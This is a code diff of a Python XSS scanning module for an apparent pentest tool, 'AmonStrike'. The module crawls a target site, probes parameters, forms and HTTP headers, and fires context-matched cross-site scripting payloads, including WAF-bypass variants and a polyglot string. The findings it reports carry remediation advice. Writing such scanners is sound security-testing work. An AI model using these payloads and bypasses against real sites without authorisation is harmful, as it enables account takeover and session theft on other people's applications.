@@ -1,204 +1,273 @@
 """
-AmonStrike — XSS Module
-Tests for Reflected, Stored, and DOM-based XSS.
+AmonStrike — XSS Module (Real-Target Edition)
+Context-aware XSS detection for real applications.
+Tests: reflected, stored indicators, DOM hints, JSON responses, headers.
 """
-
 import re
-from urllib.parse import urljoin, parse_qs, urlparse
 from .base import BaseModule
+from urllib.parse import urlparse, parse_qs, urljoin
+
+# Context-aware payloads
+XSS_PAYLOADS = {
+    "html":      "<img src=x onerror=alert(1)>",
+    "attr":      "\" onmouseover=alert(1) x=\"",
+    "js_string": "';alert(1)//",
+    "js_string2": "\";alert(1)//",
+    "url":       "javascript:alert(1)",
+    "generic":   "<svg onload=alert(1)>",
+    "generic2":  "<script>alert(1)</script>",
+    "noscript":  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    "polyglot":  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
+}
+
+# WAF bypass variants
+WAF_XSS = [
+    "<img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert`1`>",
+    "<img src=x onerror=alert(1) />",
+    "<IMG SRC=x ONERROR=alert(1)>",
+    "<img/src=x onerror=alert(1)>",
+    "<img src=\"x\" onerror=\"alert(1)\">",
+    "<svg onload=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<%2Fscript><script>alert(1)<%2Fscript>",
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "\"><img src=x onerror=alert(1)>",
+    "'><img src=x onerror=alert(1)>",
+    "--><img src=x onerror=alert(1)>",
+]
+
+MARKER = "AMXSS_CONFIRM_13337"
+
+MARKER_PAYLOADS = [
+    f"<img src=x onerror=console.log('{MARKER}')>",
+    f"<script>console.log('{MARKER}')</script>",
+    f"'{MARKER}'",
+    f"\"{MARKER}\"",
+    MARKER,
+]
 
 
 class XssModule(BaseModule):
     NAME        = "xss"
-    DESCRIPTION = "Cross-Site Scripting — reflected, stored, DOM-based"
-
-    # XSS Payloads with unique markers for detection
-    PAYLOADS = [
-        ('<script>alert("AMONSTRIKE_XSS")</script>', "Basic script tag"),
-        ('<img src=x onerror=alert("AMONSTRIKE_XSS")>', "IMG onerror"),
-        ('<svg onload=alert("AMONSTRIKE_XSS")>', "SVG onload"),
-        ('"><script>alert("AMONSTRIKE_XSS")</script>', "Break out of attribute"),
-        ("'><script>alert('AMONSTRIKE_XSS')</script>", "Single quote break"),
-        ('<body onload=alert("AMONSTRIKE_XSS")>', "Body onload"),
-        ('javascript:alert("AMONSTRIKE_XSS")', "JavaScript URI"),
-        ('<iframe src="javascript:alert(\'AMONSTRIKE_XSS\')"></iframe>', "iframe"),
-        ('<input onfocus=alert("AMONSTRIKE_XSS") autofocus>', "Input autofocus"),
-        ('<details open ontoggle=alert("AMONSTRIKE_XSS")>', "Details ontoggle"),
-        # Encoded variants
-        ('&lt;script&gt;alert("AMONSTRIKE_XSS")&lt;/script&gt;', "HTML encoded"),
-        ('%3Cscript%3Ealert("AMONSTRIKE_XSS")%3C/script%3E', "URL encoded"),
-    ]
-
-    MARKER = "AMONSTRIKE_XSS"
+    DESCRIPTION = "XSS — reflected, DOM hints, JSON, headers, context-aware"
 
     def run(self):
         self.log("Testing for Cross-Site Scripting (XSS)...")
 
-        resp = self.get()
-        if not resp:
-            return self.result()
+        # Spider for real endpoints
+        endpoints = self._spider()
+        self.log(f"Found {len(endpoints)} testable endpoints", "i")
 
-        self._test_url_params(resp)
-        self._test_forms(resp)
-        self._check_dom_sources(resp)
-        self._check_reflected_in_error(resp)
+        for ep in endpoints[:30]:
+            self._test_endpoint(ep)
+            if len(self.findings) >= 3:
+                break
+
+        # Test headers
+        self._test_headers()
 
         self.log(f"XSS scan complete — {len(self.findings)} findings", "+")
         return self.result()
 
-    def _is_reflected(self, response_text, payload):
-        """Check if payload is reflected in response."""
-        # Check for unencoded reflection
-        if self.MARKER in response_text:
-            return True
-        # Check for partial reflection (tag broken)
-        if "<script>" in payload and "<script>" in response_text:
-            return True
-        if "onerror" in payload and "onerror" in response_text:
-            return True
-        return False
+    def _spider(self) -> list:
+        endpoints = []
+        seen = set()
 
-    def _test_url_params(self, resp):
-        """Test URL parameters for reflected XSS. Spiders first."""
-        from urllib.parse import urlparse, parse_qs
+        r = self.get("")
+        if not r:
+            return endpoints
 
-        # 1. Test current URL params if present
-        parsed = urlparse(self.url)
-        if parsed.query:
-            for param, vals in parse_qs(parsed.query).items():
-                self._test_param_xss(param, vals[0])
-                if self.findings: return
+        # Links with params
+        for link in re.findall(r'href=["\']([^"\'#]+)["\']', r.text):
+            abs_url = link if link.startswith("http") else urljoin(self.url, link)
+            if self.parsed.netloc not in abs_url:
+                continue
+            p = urlparse(abs_url)
+            if p.query and abs_url not in seen:
+                seen.add(abs_url)
+                endpoints.append({"url": abs_url, "params": parse_qs(p.query),
+                                  "method": "GET", "type": "link"})
 
-        # 2. Spider homepage for links with params
-        if resp:
-            links = re.findall(r'href=["\'"]([^"\'#]+\?[^"\'#]+)["\'"]', resp.text)
-            for link in links[:20]:
-                if link.startswith("/"): link = f"{self.parsed.scheme}://{self.parsed.netloc}{link}"
-                p2 = urlparse(link)
-                for param, vals in parse_qs(p2.query).items():
-                    saved = self.url
-                    self.url = f"{p2.scheme}://{p2.netloc}{p2.path}"
-                    self._test_param_xss(param, vals[0])
-                    self.url = saved
-                    if self.findings: return
+        # Forms
+        for form in self.extract_forms(r):
+            action = form.get("action","") or ""
+            if not action.startswith("http"):
+                action = urljoin(self.url, action)
+            if action not in seen:
+                seen.add(action)
+                endpoints.append({"url": action, "params": form.get("inputs",{}),
+                                  "method": form.get("method","get").upper(), "type": "form"})
 
-        # 3. Fallback: common params on base URL
-        for param in ["q","search","s","query","name","msg","keyword","term","id","page"]:
-            self._test_param_xss(param, "test")
-            if self.findings: return
+        # Common search/input params
+        for param in ["q","search","s","query","name","msg","comment","text","input","data"]:
+            test_url = f"{self.url}?{param}=test"
+            if test_url not in seen:
+                seen.add(test_url)
+                endpoints.append({"url": self.url, "params": {param: ["test"]},
+                                  "method": "GET", "type": "common"})
 
+        # Extra from recon
+        for ep_url in getattr(self, "extra_endpoints", [])[:15]:
+            if ep_url not in seen:
+                seen.add(ep_url)
+                p = urlparse(ep_url)
+                if p.query:
+                    endpoints.append({"url": ep_url, "params": parse_qs(p.query),
+                                     "method": "GET", "type": "recon"})
 
-    def _test_param_xss(self, param, original):
-        """Test a single parameter for XSS."""
-        for payload, desc in self.PAYLOADS[:8]:
-            resp = self.get(params={param: payload})
-            if resp and self._is_reflected(resp.text, payload):
-                self.add_finding(
-                    title=f"Reflected XSS — Parameter: {param}",
-                    severity="HIGH",
-                    description=f"Reflected Cross-Site Scripting in parameter '{param}'. User input is reflected in the response without proper encoding.",
-                    evidence=f"Parameter: {param}\nPayload: {payload}\nType: {desc}\nReflected in response: YES",
-                    remediation="Encode all user input before rendering in HTML. Use Content-Security-Policy. Implement input validation.",
-                    url=resp.url if resp else self.url,
-                    cve="CWE-79"
-                )
-                return  # One finding per parameter is enough
+        return endpoints
 
-    def _test_forms(self, resp):
-        """Test form inputs for XSS."""
-        try:
-            from bs4 import BeautifulSoup
-            soup = BeautifulSoup(resp.text, "html.parser")
-            forms = soup.find_all("form")
+    def _test_endpoint(self, ep: dict):
+        url    = ep["url"]
+        method = ep["method"]
+        params = ep["params"]
 
-            for form in forms:
-                action = form.get("action", "")
-                method = form.get("method", "get").lower()
-                form_url = urljoin(self.url, action) if action else self.url
+        for param_name, param_vals in params.items():
+            orig = param_vals[0] if isinstance(param_vals, list) else param_vals
 
-                inputs = {}
-                for inp in form.find_all(["input", "textarea"]):
-                    name = inp.get("name", "")
-                    itype = inp.get("type", "text").lower()
-                    if name and itype not in ["submit", "button", "hidden", "file"]:
-                        inputs[name] = "test"
+            # First: find reflection with marker
+            for marker_p in MARKER_PAYLOADS:
+                test_params = {k: (v[0] if isinstance(v,list) else v) for k,v in params.items()}
+                test_params[param_name] = marker_p
 
-                if not inputs:
+                if method == "POST":
+                    r = self.post(url.split("?")[0], data=test_params)
+                    if not r:
+                        r = self.post(url.split("?")[0], json=test_params)
+                else:
+                    r = self.get(url.split("?")[0], params=test_params)
+
+                if not r:
                     continue
 
-                for field in inputs:
-                    for payload, desc in self.PAYLOADS[:6]:
-                        test_data = dict(inputs)
-                        test_data[field] = payload
+                # Check reflection
+                if MARKER in r.text:
+                    # Reflected! Now determine context and find working payload
+                    context = self._detect_context(r.text, MARKER)
+                    payload = self._payload_for_context(context)
 
-                        if method == "post":
-                            r = self.post(form_url.replace(self.url, ""), data=test_data)
+                    # Verify payload works
+                    test_params[param_name] = payload
+                    if method == "POST":
+                        r2 = self.post(url.split("?")[0], data=test_params)
+                        if not r2:
+                            r2 = self.post(url.split("?")[0], json=test_params)
+                    else:
+                        r2 = self.get(url.split("?")[0], params=test_params)
+
+                    if r2 and payload in r2.text:
+                        self._report(url, method, param_name, payload, r2, context)
+                        return
+
+                    # Try WAF bypass variants
+                    for waf_payload in WAF_XSS[:5]:
+                        test_params[param_name] = waf_payload
+                        if method == "POST":
+                            r3 = self.post(url.split("?")[0], data=test_params)
                         else:
-                            r = self.get(form_url.replace(self.url, ""), params=test_data)
+                            r3 = self.get(url.split("?")[0], params=test_params)
+                        if r3 and waf_payload in r3.text:
+                            self._report(url, method, param_name, waf_payload, r3, context)
+                            return
 
-                        if r and self._is_reflected(r.text, payload):
-                            self.add_finding(
-                                title=f"Reflected XSS in Form Field: {field}",
-                                severity="HIGH",
-                                description=f"XSS in form field '{field}' ({method.upper()} form).",
-                                evidence=f"Form: {form_url}\nField: {field}\nPayload: {payload}",
-                                remediation="HTML-encode all output. Use templating engines that auto-escape. Implement CSP.",
-                                url=form_url,
-                                cve="CWE-79"
-                            )
-                            break
+                    # At least report reflection even if no executable payload
+                    self._report(url, method, param_name, marker_p, r, context, reflection_only=True)
+                    break
 
-        except ImportError:
-            pass
+    def _detect_context(self, html: str, marker: str) -> str:
+        """Find what HTML context the marker landed in."""
+        idx = html.find(marker)
+        if idx == -1:
+            return "unknown"
+        before = html[max(0,idx-200):idx]
 
-    def _check_dom_sources(self, resp):
-        """Check for dangerous DOM sinks and sources."""
-        dom_sources = [
-            r"document\.location",
-            r"document\.URL",
-            r"document\.documentURI",
-            r"location\.href",
-            r"location\.search",
-            r"location\.hash",
-            r"window\.name",
-        ]
-        dom_sinks = [
-            r"document\.write\s*\(",
-            r"document\.writeln\s*\(",
-            r"innerHTML\s*=",
-            r"outerHTML\s*=",
-            r"eval\s*\(",
-            r"setTimeout\s*\(",
-            r"setInterval\s*\(",
-            r"location\.href\s*=",
-        ]
+        # Inside <script> tag
+        if re.search(r'<script[^>]*>[^<]*$', before, re.I | re.S):
+            # Inside string?
+            q_count = before.count('"') + before.count("'")
+            return "js_string" if q_count % 2 else "js_code"
 
-        found_sources = [s for s in dom_sources if re.search(s, resp.text)]
-        found_sinks   = [s for s in dom_sinks   if re.search(s, resp.text)]
+        # Inside attribute
+        if re.search(r'<[a-z]+[^>]*\s\w+=["\'][^"\']*$', before, re.I):
+            return "attr"
 
-        if found_sources and found_sinks:
-            self.add_finding(
-                title="Potential DOM-Based XSS — Dangerous Source/Sink Pattern",
-                severity="MEDIUM",
-                description="JavaScript code uses user-controllable sources with potentially dangerous sinks. Manual review required to confirm exploitability.",
-                evidence=f"Sources found: {', '.join(found_sources)}\nSinks found: {', '.join(found_sinks)}",
-                remediation="Avoid writing user-controlled data to dangerous sinks. Use textContent instead of innerHTML. Sanitize DOM input.",
-                url=self.url,
-                cve="CWE-79"
-            )
+        # Inside href/src
+        if re.search(r'<[a-z]+[^>]*(href|src|action)=["\'][^"\']*$', before, re.I):
+            return "url_attr"
 
-    def _check_reflected_in_error(self, resp):
-        """Check if error pages reflect user input."""
-        # Request a non-existent page with XSS payload in path
-        payload = '<script>alert("AMONSTRIKE_XSS")</script>'
-        r = self.get(f"/nonexistent{payload}")
-        if r and self._is_reflected(r.text, payload):
-            self.add_finding(
-                title="XSS in Error Page",
-                severity="HIGH",
-                description="The error page reflects user input without encoding. XSS possible via crafted URL.",
-                evidence=f"Path payload reflected in {r.status_code} error page.",
-                remediation="Encode all reflected content in error pages. Use generic error messages.",
-                url=self.url,
-                cve="CWE-79"
-            )
+        # Default: HTML body
+        return "html"
+
+    def _payload_for_context(self, context: str) -> str:
+        return {
+            "html":      "<img src=x onerror=alert(1)>",
+            "attr":      "\" onmouseover=alert(1) foo=\"",
+            "js_string": "';alert(1)//",
+            "js_string2":"\"};alert(1)//",
+            "js_code":   "alert(1);",
+            "url_attr":  "javascript:alert(1)",
+        }.get(context, "<img src=x onerror=alert(1)>")
+
+    def _test_headers(self):
+        """Test XSS via HTTP headers that get reflected."""
+        injectable_headers = {
+            "User-Agent":     f"<img src=x onerror=alert(1)>",
+            "Referer":        f"{self.url}/<img src=x onerror=alert(1)>",
+            "X-Forwarded-For":f"<img src=x onerror=alert(1)>",
+            "X-Custom-Name":  f"<img src=x onerror=alert(1)>",
+        }
+        for header, payload in injectable_headers.items():
+            r = self.get("", headers={header: payload})
+            if r and payload in r.text:
+                self.add_finding(
+                    title       = f"Reflected XSS via HTTP Header: {header}",
+                    severity    = "HIGH",
+                    description = (
+                        f"XSS payload injected via {header} header is reflected "
+                        f"unencoded in the response body."
+                    ),
+                    evidence    = f"Header: {header}: {payload}\nReflected in response: YES",
+                    remediation = "Encode all HTTP header values before including in HTML output.",
+                    url         = self.url,
+                    parameter   = header,
+                    payload     = payload,
+                    cve         = "CWE-79",
+                )
+
+    def _report(self, url, method, param, payload, resp, context,
+                reflection_only=False):
+        if reflection_only:
+            sev  = "MEDIUM"
+            title= f"Reflected Input (Potential XSS) — Parameter '{param}' [{method}]"
+            desc = (f"User input via '{param}' is reflected in the response without encoding "
+                    f"(context: {context}). Manual verification recommended to confirm XSS.")
+        else:
+            sev  = "HIGH"
+            title= f"Reflected XSS — Parameter '{param}' [{method}] (context: {context})"
+            desc = (f"Cross-site Scripting confirmed via {method} parameter '{param}'. "
+                    f"Payload executed in {context} context. "
+                    f"Enables session hijacking, account takeover, and malicious JS execution.")
+
+        self.add_finding(
+            title       = title,
+            severity    = sev,
+            description = desc,
+            evidence    = (
+                f"URL: {url}\nMethod: {method}\nParameter: {param}\n"
+                f"Context: {context}\nPayload: {payload}\n"
+                f"Payload reflected: {'YES (executable)' if not reflection_only else 'YES (unencoded)'}"
+            ),
+            remediation = (
+                "1. HTML-encode all output (use templating engine auto-escaping)\n"
+                "2. Implement Content-Security-Policy header\n"
+                "3. Use HttpOnly cookies to prevent session theft via XSS"
+            ),
+            url         = url,
+            parameter   = param,
+            payload     = payload,
+            cve         = "CWE-79",
+        )
